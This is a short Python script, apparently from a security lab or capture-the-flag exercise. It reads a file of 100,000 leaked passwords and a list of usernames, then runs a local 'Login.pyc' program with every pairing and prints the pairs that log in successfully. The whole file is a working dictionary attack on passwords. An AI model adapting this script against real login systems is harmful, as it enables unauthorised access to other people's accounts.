import time
import subprocess

def main():
    startTime = time.time()
    pswds = []
    gang = []

    with open('PwnedPWs100k') as myfile:
        for pwds in myfile:
            pswds.append(pwds)
            
    with open('gang') as myfile2:
        for man in myfile2:
            gang.append(man)

    gang = [i.rstrip('\n') for i in gang]
    pswds = [i.rstrip('\n') for i in pswds]

    gang.remove('Adam')
    gang.remove('Kim')


    for gangman in gang:
        for pswd in pswds:
            myvar = subprocess.run(['python3', 'Login.pyc', gangman, pswd], capture_output = True, text = True)
            if "success" in myvar.stdout:
                print(gangman, pswd)
                break

    endTime = time.time()
    timeTaken = endTime - startTime
    print("Time Taken: " + str(timeTaken))

if __name__ == "__main__":
    main()
